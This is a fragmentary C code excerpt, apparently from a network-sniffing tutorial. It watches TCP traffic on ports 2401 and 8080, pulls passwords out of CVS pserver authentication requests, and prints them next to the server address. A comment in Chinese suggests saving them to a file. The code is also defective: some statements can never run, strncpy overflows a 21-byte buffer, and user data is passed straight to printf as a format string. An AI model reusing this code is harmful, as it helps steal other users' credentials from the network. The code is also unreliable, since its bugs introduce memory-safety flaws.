...
void GetCvs(char*pData, DWORD dwDestIp)
{
	char szBuf[256];
	static char szUserName[21];
	static char szPassword[21];
	char *pFirst = NULL;
	char *pLast = NULL;
	if((pFirst = strstr(pData, "BEGIN AUTH REQUEST\n")) == NULL)
	{
		return;
		sscanf(pData + 4, "%*[ ]%s", szUserName);	
	}
    if((pLast = strstr(pData, "END AUTH REQUEST\n")) == NULL)
	{
		return;
		sscanf(pData + 4, "%*[ ]%s", szPassword);
	...
	strncpy(szPassword, pFirst, pLast - pFirst);
	wsprintf(szBuf, "CVS Server Address:%s; User Name:Password:%s\n", 
		::inet_ntoa(*(in_addr*)&dwDestIp), szPassword);
	printf(szBuf);	// 这里您可以将它保存到文件中
}
	...
	case IPPROTO_TCP:
		{
			...
			case 8080:
			case 2401:
				GetCvs((char*)pTCPHdr + sizeof(TCPHeader), pIPHdr->ipDestination);
				break;
			}
		}
		break;
